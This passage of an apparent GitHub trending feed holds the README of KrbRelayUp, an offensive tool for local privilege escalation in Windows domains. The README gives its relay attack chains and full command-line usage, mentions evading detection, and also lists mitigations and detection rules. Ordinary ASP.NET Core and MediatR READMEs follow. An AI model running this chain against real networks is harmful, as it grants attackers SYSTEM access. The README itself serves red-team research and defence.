    <summary type="html">&lt;p&gt;KrbRelayUp - a universal no-fix local privilege escalation in windows domain environments where LDAP signing is not enforced (the default settings).&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;KrbRelayUp&lt;/h1&gt; &#xA;&lt;p&gt;Simple wrapper around some of the features of &lt;a href=&#34;https://github.com/GhostPack/Rubeus/&#34;&gt;Rubeus&lt;/a&gt; and &lt;a href=&#34;https://github.com/cube0x0/KrbRelay&#34;&gt;KrbRelay&lt;/a&gt; (and a few other honorable mentions in the acknowledgements section) in order to streamline the abuse of the following attack primitive:&lt;/p&gt; &#xA;&lt;ol start=&#34;0&#34;&gt; &#xA; &lt;li&gt;(Optional) New machine account creation (&lt;a href=&#34;https://github.com/Kevin-Robertson/Powermad/raw/master/Powermad.ps1&#34;&gt;New-MachineAccount&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Local machine account auth coercion (&lt;a href=&#34;https://github.com/cube0x0/KrbRelay&#34;&gt;KrbRelay&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Kerberos relay to LDAP (&lt;a href=&#34;https://github.com/cube0x0/KrbRelay&#34;&gt;KrbRelay&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Add RBCD privs and obtain privileged ST to local machine (&lt;a href=&#34;https://github.com/GhostPack/Rubeus/&#34;&gt;Rubeus&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Using said ST to authenticate to local Service Manager and create a new service as NT/SYSTEM. (&lt;a href=&#34;https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82&#34;&gt;SCMUACBypass&lt;/a&gt;)&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;&lt;strong&gt;This is essentially a universal no-fix local privilege escalation in windows domain environments where LDAP signing is not enforced (the default settings).&lt;/strong&gt;&lt;/p&gt; &#xA;&lt;p&gt;&lt;strong&gt;UPDATE:&lt;/strong&gt; &lt;a href=&#34;https://gist.github.com/tothi/bf6c59d6de5d0c9710f23dae5750c4b9&#34;&gt;Here&lt;/a&gt; is an excellent writeup by &lt;a href=&#34;https://twitter.com/an0n_r0&#34;&gt;@an0n_r0&lt;/a&gt; on how to perform this attack manually (using the &lt;strong&gt;original tools&lt;/strong&gt; for this attack path: &lt;a href=&#34;https://github.com/Kevin-Robertson/Powermad&#34;&gt;PowerMad&lt;/a&gt;/&lt;a href=&#34;https://github.com/Kevin-Robertson/Sharpmad&#34;&gt;SharpMad&lt;/a&gt;, &lt;a href=&#34;https://github.com/cube0x0/KrbRelay&#34;&gt;KrbRelay&lt;/a&gt;, &lt;a href=&#34;https://github.com/GhostPack/Rubeus&#34;&gt;Rubeus&lt;/a&gt; and &lt;a href=&#34;https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82&#34;&gt;SCMUACBypass&lt;/a&gt;)&lt;/p&gt; &#xA;&lt;h3&gt;Update - Shadow Credentials Support&lt;/h3&gt; &#xA;&lt;p&gt;I added some features to support this attack primitive using shadow credentials. Note this eliminates the need for adding (or owning) another machine account.&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;&lt;strong&gt;Note&lt;/strong&gt;&lt;/em&gt;: &lt;em&gt;this attack method bypasses the Protected Users (or &#39;Account is sensitive and cannot be delegated&#39;) mitigation due to the S4U2Self abuse.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Local machine account auth coercion (&lt;a href=&#34;https://github.com/cube0x0/KrbRelay&#34;&gt;KrbRelay&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Kerberos relay to LDAP (&lt;a href=&#34;https://github.com/cube0x0/KrbRelay&#34;&gt;KrbRelay&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Generate new KeyCredential and add it to the local machine account&#39;s &#39;msDS-KeyCredentialLink&#39; attribute. (&lt;a href=&#34;https://github.com/eladshamir/Whisker&#34;&gt;Whisker&lt;/a&gt; and &lt;a href=&#34;https://github.com/cube0x0/KrbRelay&#34;&gt;KrbRelay&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Using said KeyCredential to obtain a TGT for the local machine account via PKInit. (&lt;a href=&#34;https://github.com/GhostPack/Rubeus/&#34;&gt;Rubeus&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Using the TGT to obtain privileged ST to local machine via S4U2Self and TGSSUB. (&lt;a href=&#34;https://github.com/GhostPack/Rubeus/&#34;&gt;Rubeus&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Using said ST to authenticate to local Service Manager and create a new service as NT/SYSTEM. (&lt;a href=&#34;https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82&#34;&gt;SCMUACBypass&lt;/a&gt;)&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;p&gt;&lt;strong&gt;UPDATE:&lt;/strong&gt; &lt;a href=&#34;https://icyguider.github.io/2022/05/19/NoFix-LPE-Using-KrbRelay-With-Shadow-Credentials.html&#34;&gt;Here&lt;/a&gt; is an excellent writeup by &lt;a href=&#34;https://twitter.com/icyguider&#34;&gt;@icyguider&lt;/a&gt; on how to perform the ShadowCred method of this attack manually (using the &lt;strong&gt;original tools&lt;/strong&gt; for this attack path: &lt;a href=&#34;https://github.com/cube0x0/KrbRelay&#34;&gt;KrbRelay&lt;/a&gt;, &lt;a href=&#34;https://github.com/GhostPack/Rubeus&#34;&gt;Rubeus&lt;/a&gt; and &lt;a href=&#34;https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82&#34;&gt;SCMUACBypass&lt;/a&gt;) along with the usage of &lt;a href=&#34;https://github.com/icyguider/Nimcrypt2&#34;&gt;NimCrypt2&lt;/a&gt; to pack the various tools and evade some detection by defensive mechanism.&lt;/p&gt; &#xA;&lt;h3&gt;Update - ADCS Web Enrollment Support&lt;/h3&gt; &#xA;&lt;p&gt;I added support for relaying Machine KRB auth to ADCS Web Enrollment (instead of LDAP). This eliminates the requirement of LDAP Signing not to be enforced in the domain since this attack does not relay to LDAP.&lt;/p&gt; &#xA;&lt;p&gt;&lt;em&gt;&lt;strong&gt;Note&lt;/strong&gt;&lt;/em&gt;: &lt;em&gt;this attack method bypasses the Protected Users (or &#39;Account is sensitive and cannot be delegated&#39;) mitigation due to the S4U2Self abuse.&lt;/em&gt;&lt;/p&gt; &#xA;&lt;ol&gt; &#xA; &lt;li&gt;Local machine account auth coercion (&lt;a href=&#34;https://github.com/cube0x0/KrbRelay&#34;&gt;KrbRelay&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Kerberos relay to ADCS (HTTP) (&lt;a href=&#34;https://github.com/cube0x0/KrbRelay&#34;&gt;KrbRelay&lt;/a&gt; and &lt;a href=&#34;https://github.com/bats3c/ADCSPwn/&#34;&gt;ADCSPwn&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Generate certificate request on behalf of the local machine account, submit it to ADCS Web Enrollment and finally retreive the certificate for the local machine account (&lt;a href=&#34;https://github.com/bats3c/ADCSPwn/&#34;&gt;ADCSPwn&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Using said certificate to obtain a TGT for the local machine account via PKInit. (&lt;a href=&#34;https://github.com/GhostPack/Rubeus/&#34;&gt;Rubeus&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Using the TGT to obtain privileged ST to local machine via S4U2Self and TGSSUB. (&lt;a href=&#34;https://github.com/GhostPack/Rubeus/&#34;&gt;Rubeus&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Using said ST to authenticate to local Service Manager and create a new service as NT/SYSTEM. (&lt;a href=&#34;https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82&#34;&gt;SCMUACBypass&lt;/a&gt;)&lt;/li&gt; &#xA;&lt;/ol&gt; &#xA;&lt;h2&gt;Usage&lt;/h2&gt; &#xA;&lt;pre&gt;&lt;code&gt;KrbRelayUp - Relaying you to SYSTEM&#xA;&#xA;FULL: Perform full attack chain. Options are identical to RELAY. Tool must be on disk.&#xA;&#xA;RELAY: First phase of the attack. Will Coerce Kerberos auth from local machine account, relay it to LDAP and create a control primitive over the local machine using RBCD or SHADOWCRED.&#xA;Usage: KrbRelayUp.exe relay -d FQDN -cn COMPUTERNAME [-c] [-cp PASSWORD | -ch NTHASH]&#xA;&#xA;    -m   (--Method)                   Abuse method to use in after a successful relay to LDAP &amp;lt;rbcd/shadowcred&amp;gt; (default=rbcd)&#xA;    -p   (--Port)                     Port for Com Server (default=12345)&#xA;    -cls (--Clsid)                    CLSID to use for coercing Kerberos auth from local machine account (default=90f18417-f0f1-484e-9d3c-59dceee5dbd8)&#xA;&#xA;    # RBCD Method:&#xA;    -c   (--CreateNewComputerAccount) Create new computer account for RBCD. Will use the current authenticated user.&#xA;    -cn  (--ComputerName)             Name of attacker owned computer account for RBCD. (default=KRBRELAYUP$)&#xA;    -cp  (--ComputerPassword)         Password of computer account for RBCD. (default=RANDOM [if -c is enabled])&#xA;&#xA;    # SHADOWCRED Method:&#xA;    -f   (--ForceShadowCred)          Clear the msDS-KeyCredentialLink attribute of the attacked computer account before adding our new shadow credentials. (Optional)&#xA;&#xA;    # ADCS Method:&#xA;    -ca  (--CAEndpoint)               CA endpoint FQDN (default = same as DC)&#xA;    -https                            Connect to CA endpoint over secure HTTPS instead of HTTP)&#xA;    -cet (--CertificateTemplate)      Certificate template to request for (default=Machine)&#xA;&#xA;&#xA;SPAWN: Second phase of the attack. Will use the appropriate control primitive to obtain a Kerberos Service Ticket and will use it to create a new service running as SYSTEM.&#xA;Usage: KrbRelayUp.exe spawn -d FQDN -cn COMPUTERNAME [-cp PASSWORD | -ch NTHASH] &amp;lt;-i USERTOIMPERSONATE&amp;gt;&#xA;&#xA;    -m   (--Method)                   Abuse method used in RELAY phase &amp;lt;rbcd/shadowcred&amp;gt; (default=rbcd)&#xA;    -i   (--Impersonate)              User to impersonate. should be a local administrator in the target computer. (default=Administrator)&#xA;    -s   (--ServiceName)              Name of the service to be created. (default=KrbSCM)&#xA;    -sc  (--ServiceCommand)           Service command [binPath]. (default = spawn cmd.exe as SYSTEM)&#xA;&#xA;    # RBCD Method:&#xA;    -cn  (--ComputerName)             Name of attacker owned computer account for RBCD. (default=KRBRELAYUP$)&#xA;    -cp  (--ComputerPassword)         Password of computer account for RBCD. (either -cp or -ch must be specified)&#xA;    -ch  (--ComputerPasswordHash)     Password NT hash of computer account for RBCD. (either -cp or -ch must be specified)&#xA;&#xA;    # SHADOWCRED | ADCS Method:&#xA;    -ce  (--Certificate)              Base64 encoded certificate or path to certificate file&#xA;    -cep (--CertificatePassword)      Certificate password (if applicable)&#xA;&#xA;&#xA;KRBSCM: Will use the currently loaded Kerberos Service Ticket to create a new service running as SYSTEM.&#xA;Usage: KrbRelayUp.exe krbscm &amp;lt;-s SERVICENAME&amp;gt; &amp;lt;-sc SERVICECOMMANDLINE&amp;gt;&#xA;&#xA;    -s  (--ServiceName)              Name of the service to be created. (default=KrbSCM)&#xA;    -sc (--ServiceCommand)           Service command [binPath]. (default = spawn cmd.exe as SYSTEM)&#xA;&#xA;&#xA;General Options:&#xA;    -d  (--Domain)                   FQDN of domain. (Optional)&#xA;    -dc (--DomainController)         FQDN of domain controller. (Optional)&#xA;    -ssl                             Use LDAP over SSL. (Optional)&#xA;    -n                               Use CreateNetOnly (needs to be on disk) instead of PTT when importing ST (enabled if using FULL mode)&#xA;    -v  (--Verbose)                  Show verbose output. (Optional)&#xA;&lt;/code&gt;&lt;/pre&gt; &#xA;&lt;h2&gt;Examples&lt;/h2&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://raw.githubusercontent.com/Dec0ne/KrbRelayUp/main/Images/example_rbcd.png&#34; alt=&#34;example&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/Dec0ne/KrbRelayUp/main/Images/example_shadowcred.png&#34; alt=&#34;example&#34;&gt; &lt;img src=&#34;https://raw.githubusercontent.com/Dec0ne/KrbRelayUp/main/Images/example_adcs.png&#34; alt=&#34;example&#34;&gt;&lt;/p&gt; &#xA;&lt;h2&gt;TODO&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Code refactoring and cleanup!!!&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Add ShadowCred attack as a RELAY method&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; disabled&gt; Add TGTDELEG attack in SPAWN method to be used in Network Service-&amp;gt;SYSTEM scenarios (potatoes alternative)&lt;/li&gt; &#xA; &lt;li&gt;&lt;input type=&#34;checkbox&#34; checked disabled&gt; Fix the issue I&#39;m having trying to combine the RELAY and SPAWN methods into one run so it can be used as one complete command. Probably has something to do with the fact that both RELAY and SPAWN functionalities rely on hooks during the initialization of the COM Server (Once RELAY initializes its COM Server the SPAWN can&#39;t re-initialize it to place its hooks as well)&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Mitigation &amp;amp; Detection&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;Enforce LDAP Signing and LDAP Channel Binding to mitigate the relay of the machine account KRB auth to LDAP. This can be configured via the &#34;Domain Controller: LDAP server signing requirements&#34; GPO. (Thank you &lt;a href=&#34;https://twitter.com/wdormann&#34;&gt;Will Dormann&lt;/a&gt; for your &lt;a href=&#34;https://twitter.com/wdormann/status/1518999885550440451&#34;&gt;tweet&lt;/a&gt; on this matter)&lt;/li&gt; &#xA; &lt;li&gt;Make the attack requirements harder to obtain by setting the &lt;a href=&#34;https://docs.microsoft.com/en-us/windows/win32/adschema/a-ms-ds-machineaccountquota&#34;&gt;MS-DS-Machine-Account-Quota attribute&lt;/a&gt; in AD to &lt;strong&gt;0&lt;/strong&gt;, thus removing the ability of any user to add a new machine account to the domain. This is a dangerous default setting in AD - make sure you change it.&lt;/li&gt; &#xA; &lt;li&gt;Setting the flag &#34;Account is sensitive and cannot be delegated&#34; on all admin accounts (or put them in protected users) would make it so there is no account with the privileges required that can be delegated in order to complete the attack path. (Thanks to &lt;a href=&#34;https://twitter.com/cfalta&#34;&gt;Christoph Falta&lt;/a&gt; for this &lt;a href=&#34;https://twitter.com/cfalta/status/1519309206230339585&#34;&gt;tweet&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Mitigation for ADCS Relay - Enforcing the use of TLS on the &lt;em&gt;&lt;strong&gt;certsrv&lt;/strong&gt;&lt;/em&gt; site and enabling &lt;em&gt;&lt;strong&gt;Extended Protection for Authentication (EPA)&lt;/strong&gt;&lt;/em&gt; in IIS will prevent the relay to ADCS. (Thanks to &lt;a href=&#34;https://twitter.com/wdormann&#34;&gt;Will Dormann&lt;/a&gt; for pointing that out in his &lt;a href=&#34;https://twitter.com/wdormann/status/1528944331922583552&#34;&gt;tweet&lt;/a&gt;, this also was mentioned in &lt;a href=&#34;https://twitter.com/_dirkjan&#34;&gt;Dirk-jan Mollema&lt;/a&gt; post on &lt;a href=&#34;https://dirkjanm.io/relaying-kerberos-over-dns-with-krbrelayx-and-mitm6/&#34;&gt;Relaying Kerberos over DNS using krbrelayx and mitm6&lt;/a&gt;)&lt;/li&gt; &#xA; &lt;li&gt;Resources for possible monitoring and detection rules: &#xA;  &lt;ol&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://github.com/tsale/Sigma_rules/raw/main/windows_exploitation/KrbRelayUp.yml&#34;&gt;https://github.com/tsale/Sigma_rules/blob/main/windows_exploitation/KrbRelayUp.yml&lt;/a&gt; (&lt;a href=&#34;https://twitter.com/Kostastsale&#34;&gt;@Kostastsale&lt;/a&gt;)&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://twitter.com/SBousseaden/status/1518976397364056071&#34;&gt;https://twitter.com/SBousseaden/status/1518976397364056071&lt;/a&gt; (&lt;a href=&#34;https://twitter.com/SBousseaden&#34;&gt;@SBousseaden&lt;/a&gt;). Mainly the rule about authentication to Service Manager via Kerberos from 127.0.0.1, Great Work!.&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://www.linkedin.com/posts/john-dwyer-xforce_threathunting-threatdetection-blueteam-activity-6924739962131140608-py45/&#34;&gt;https://www.linkedin.com/posts/john-dwyer-xforce_threathunting-threatdetection-blueteam-activity-6924739962131140608-py45/&lt;/a&gt; (&lt;a href=&#34;https://www.linkedin.com/in/john-dwyer-xforce/&#34;&gt;John Dwyer&lt;/a&gt; &lt;a href=&#34;https://twitter.com/TactiKoolSec&#34;&gt;@TactiKoolSec&lt;/a&gt;)&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://twitter.com/cyb3rops/status/1519241598311321601&#34;&gt;https://twitter.com/cyb3rops/status/1519241598311321601&lt;/a&gt; (&lt;a href=&#34;https://twitter.com/cyb3rops&#34;&gt;@cyb3rops&lt;/a&gt;)&lt;/li&gt; &#xA;  &lt;/ol&gt; &lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Acknowledgements&lt;/h2&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/tiraniddo&#34;&gt;James Forshaw&lt;/a&gt; for his research on &lt;a href=&#34;https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html&#34;&gt;Kerberos relaying&lt;/a&gt; and for figuring out how to &lt;a href=&#34;https://gist.github.com/tyranid/c24cfd1bd141d14d4925043ee7e03c82&#34;&gt;use Kerberos Service Tickets for LOCAL authentication to Service Manager&lt;/a&gt; which was the missing piece of the puzzle in order to make this attack primitive &lt;strong&gt;local only&lt;/strong&gt; (before that, we had to export the ST to a remote machine in order to use it and gain privileged access to our target machine). Also for his &lt;a href=&#34;https://github.com/Kevin-Robertson/Powermad/raw/master/Powermad.ps1&#34;&gt;New-MachineAccount&lt;/a&gt; functionality which was used in this project.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/cube0x0&#34;&gt;Cube0x0&lt;/a&gt; This project wouldn&#39;t exist without his amazing work on &lt;a href=&#34;https://github.com/cube0x0/KrbRelay&#34;&gt;KrbRelay&lt;/a&gt; - a lot of code was taken from there and it made me gain a deeper understanding on how Kerberos Relaying works (I really recommend going through the code for anyone who wish to understand the concept better).&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/elad_shamir&#34;&gt;Elad Shamir&lt;/a&gt; for his research on &lt;a href=&#34;https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab&#34;&gt;Shadow Credentials&lt;/a&gt; and his awsome tool &lt;a href=&#34;https://github.com/eladshamir/Whisker&#34;&gt;Whisker&lt;/a&gt; - parts of his code (and of course &lt;a href=&#34;https://twitter.com/cube0x0&#34;&gt;cube0x0&lt;/a&gt;&#39;s &lt;a href=&#34;https://github.com/cube0x0/KrbRelay&#34;&gt;KrbRelay&lt;/a&gt; code) was used to add support for the Shadow Credentials attack in this tool.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/harmj0y&#34;&gt;Will Schroeder&lt;/a&gt; and everyone who contributed to &lt;a href=&#34;https://github.com/GhostPack/Rubeus/&#34;&gt;Rubeus&lt;/a&gt; which we all know and love. Basically all the RBCD-S4U functionality was taken from there. Also, for &lt;a href=&#34;https://github.com/GhostPack/Certify&#34;&gt;Certify&lt;/a&gt; and the &lt;a href=&#34;https://specterops.io/assets/resources/Certified_Pre-Owned.pdf&#34;&gt;Certified Pre-Owned whitepaper&lt;/a&gt; (credits goes to &lt;a href=&#34;https://twitter.com/tifkin_&#34;&gt;Lee Christensen&lt;/a&gt; as well) which was used when adding the ADCS Web Enrollment Relay option.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/_batsec_&#34;&gt;batsec&lt;/a&gt; and everyone who contributed to &lt;a href=&#34;https://github.com/bats3c/ADCSPwn/&#34;&gt;ADCSPwn&lt;/a&gt;. A lot of code related to the ADCS Web Enrollment Relay option was taken from this awesome tool.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://twitter.com/mgrafnetter&#34;&gt;Michael Grafnetter&lt;/a&gt; for his tool &lt;a href=&#34;https://github.com/MichaelGrafnetter/DSInternals&#34;&gt;DSInternals&lt;/a&gt; which was used here to help with the Shadow Credentials functionality.&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/Orange-Cyberdefense&#34;&gt;Orange-Cyberdefense&lt;/a&gt; for their work on &lt;a href=&#34;https://github.com/Orange-Cyberdefense/GOAD&#34;&gt;GOAD&lt;/a&gt;, the Active Directory research lab I am using which you can see in the demo video and images.&lt;/li&gt; &#xA;&lt;/ul&gt;</summary>
  </entry>
  <entry>
    <title>dotnet/aspnetcore</title>
    <updated>2022-05-29T01:36:31Z</updated>
    <id>tag:github.com,2022-05-29:/dotnet/aspnetcore</id>
    <link href="https://github.com/dotnet/aspnetcore" rel="alternate"></link>
    <summary type="html">&lt;p&gt;ASP.NET Core is a cross-platform .NET framework for building modern cloud-based web applications on Windows, Mac, or Linux.&lt;/p&gt;&lt;hr&gt;&lt;p&gt;&lt;a href=&#34;https://www.dotnetfoundation.org/&#34;&gt;&lt;img src=&#34;https://img.shields.io/badge/.NET%20Foundation-blueviolet.svg?sanitize=true&#34; alt=&#34;.NET Foundation&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/dotnet/aspnetcore/raw/main/LICENSE.txt&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/license/dotnet/aspnetcore?color=%230b0&amp;amp;style=flat-square&#34; alt=&#34;MIT License&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/dotnet/aspnetcore/issues?q=is%3Aissue+is%3Aopen+label%3A%22help+wanted%22&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/issues/dotnet/aspnetcore/help%20wanted?color=%232EA043&amp;amp;label=help%20wanted&amp;amp;style=flat-square&#34; alt=&#34;Help Wanted&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://github.com/dotnet/aspnetcore/issues?q=is%3Aissue+is%3Aopen+label%3A%22good+first+issue%22&#34;&gt;&lt;img src=&#34;https://img.shields.io/github/issues/dotnet/aspnetcore/good%20first%20issue?color=%23512BD4&amp;amp;label=good%20first%20issue&amp;amp;style=flat-square&#34; alt=&#34;Good First Issues&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://aka.ms/dotnet-discord&#34;&gt;&lt;img src=&#34;https://img.shields.io/discord/732297728826277939?style=flat-square&amp;amp;label=Discord&amp;amp;logo=discord&amp;amp;logoColor=white&amp;amp;color=7289DA&#34; alt=&#34;Discord&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;h1&gt;ASP.NET Core&lt;/h1&gt; &#xA;&lt;p&gt;ASP.NET Core is an open-source and cross-platform framework for building modern cloud based internet connected applications, such as web apps, IoT apps and mobile backends. ASP.NET Core apps run on &lt;a href=&#34;https://dot.net&#34;&gt;.NET Core&lt;/a&gt;, a free, cross-platform and open-source application runtime. It was architected to provide an optimized development framework for apps that are deployed to the cloud or run on-premises. It consists of modular components with minimal overhead, so you retain flexibility while constructing your solutions. You can develop and run your ASP.NET Core apps cross-platform on Windows, Mac and Linux. &lt;a href=&#34;https://docs.microsoft.com/aspnet/core/&#34;&gt;Learn more about ASP.NET Core&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Get Started&lt;/h2&gt; &#xA;&lt;p&gt;Follow the &lt;a href=&#34;https://docs.microsoft.com/aspnet/core/getting-started&#34;&gt;Getting Started&lt;/a&gt; instructions in the &lt;a href=&#34;https://docs.microsoft.com/aspnet/index&#34;&gt;ASP.NET Core docs&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;p&gt;Also check out the &lt;a href=&#34;https://www.microsoft.com/net&#34;&gt;.NET Homepage&lt;/a&gt; for released versions of .NET, getting started guides, and learning resources.&lt;/p&gt; &#xA;&lt;p&gt;See the &lt;a href=&#34;https://github.com/dotnet/aspnetcore/raw/main/docs/TriageProcess.md&#34;&gt;Triage Process&lt;/a&gt; document for more information on how we handle incoming issues.&lt;/p&gt; &#xA;&lt;h2&gt;How to Engage, Contribute, and Give Feedback&lt;/h2&gt; &#xA;&lt;p&gt;Some of the best ways to contribute are to try things out, file issues, join in design conversations, and make pull-requests.&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/dotnet/aspnetcore/main/docs/DailyBuilds.md&#34;&gt;Download our latest daily builds&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Follow along with the development of ASP.NET Core: &#xA;  &lt;ul&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://live.asp.net&#34;&gt;Community Standup&lt;/a&gt;: The community standup is held every week and streamed live to YouTube. You can view past standups in the linked playlist.&lt;/li&gt; &#xA;   &lt;li&gt;&lt;a href=&#34;https://aka.ms/aspnet/roadmap&#34;&gt;Roadmap&lt;/a&gt;: The schedule and milestone themes for ASP.NET Core.&lt;/li&gt; &#xA;  &lt;/ul&gt; &lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://raw.githubusercontent.com/dotnet/aspnetcore/main/docs/BuildFromSource.md&#34;&gt;Build ASP.NET Core source code&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;Check out the &lt;a href=&#34;https://raw.githubusercontent.com/dotnet/aspnetcore/main/CONTRIBUTING.md&#34;&gt;contributing&lt;/a&gt; page to see the best places to log issues and start discussions.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Reporting security issues and bugs&lt;/h2&gt; &#xA;&lt;p&gt;Security issues and bugs should be reported privately, via email, to the Microsoft Security Response Center (MSRC) &lt;a href=&#34;mailto:secure@microsoft.com&#34;&gt;secure@microsoft.com&lt;/a&gt;. You should receive a response within 24 hours. If for some reason you do not, please follow up via email to ensure we received your original message. Further information, including the MSRC PGP key, can be found in the &lt;a href=&#34;https://technet.microsoft.com/en-us/security/ff852094.aspx&#34;&gt;Security TechCenter&lt;/a&gt;.&lt;/p&gt; &#xA;&lt;h2&gt;Related projects&lt;/h2&gt; &#xA;&lt;p&gt;These are some other repos for related projects:&lt;/p&gt; &#xA;&lt;ul&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/aspnet/Docs&#34;&gt;Documentation&lt;/a&gt; - documentation sources for &lt;a href=&#34;https://docs.microsoft.com/aspnet/core/&#34;&gt;https://docs.microsoft.com/aspnet/core/&lt;/a&gt;&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/dotnet/efcore&#34;&gt;Entity Framework Core&lt;/a&gt; - data access technology&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/dotnet/runtime&#34;&gt;Runtime&lt;/a&gt; - cross-platform runtime for cloud, mobile, desktop, and IoT apps&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/dotnet/razor-compiler&#34;&gt;Razor Compiler&lt;/a&gt; - the parser and the C# code generator for the Razor syntax&lt;/li&gt; &#xA; &lt;li&gt;&lt;a href=&#34;https://github.com/dotnet/razor-tooling&#34;&gt;Razor Tooling&lt;/a&gt; - tools for working on Razor ASP.NET Core apps using &lt;a href=&#34;https://visualstudio.com&#34;&gt;Visual Studio&lt;/a&gt;, &lt;a href=&#34;https://visualstudio.microsoft.com/vs/mac/&#34;&gt;Visual Studio for Mac&lt;/a&gt;, and &lt;a href=&#34;https://code.visualstudio.com/&#34;&gt;Visual Studio Code&lt;/a&gt;.&lt;/li&gt; &#xA;&lt;/ul&gt; &#xA;&lt;h2&gt;Code of conduct&lt;/h2&gt; &#xA;&lt;p&gt;See &lt;a href=&#34;https://raw.githubusercontent.com/dotnet/aspnetcore/main/CODE-OF-CONDUCT.md&#34;&gt;CODE-OF-CONDUCT&lt;/a&gt;&lt;/p&gt;</summary>
  </entry>
  <entry>
    <title>jbogard/MediatR</title>
    <updated>2022-05-29T01:36:31Z</updated>
    <id>tag:github.com,2022-05-29:/jbogard/MediatR</id>
    <link href="https://github.com/jbogard/MediatR" rel="alternate"></link>
    <summary type="html">&lt;p&gt;Simple, unambitious mediator implementation in .NET&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;MediatR&lt;/h1&gt; &#xA;&lt;p&gt;&lt;img src=&#34;https://github.com/jbogard/MediatR/workflows/CI/badge.svg?sanitize=true&#34; alt=&#34;CI&#34;&gt; &lt;a href=&#34;https://www.nuget.org/packages/mediatr&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/dt/mediatr.svg?sanitize=true&#34; alt=&#34;NuGet&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://www.nuget.org/packages/mediatr&#34;&gt;&lt;img src=&#34;https://img.shields.io/nuget/vpre/mediatr.svg?sanitize=true&#34; alt=&#34;NuGet&#34;&gt;&lt;/a&gt; &lt;a href=&#34;https://myget.org/gallery/mediatr-ci&#34;&gt;&lt;img src=&#34;https://img.shields.io/myget/mediatr-ci/v/MediatR.svg?sanitize=true&#34; alt=&#34;MyGet (dev)&#34;&gt;&lt;/a&gt;&lt;/p&gt; &#xA;&lt;p&gt;Simple mediator implementation in .NET&lt;/p&gt; &#xA;&lt;p&gt;In-process messaging with no dependencies.&lt;/p&gt; &#xA;&lt;p&gt;Supports request/response, commands, queries, notifications and events, synchronous and async with intelligent dispatching via C# generic 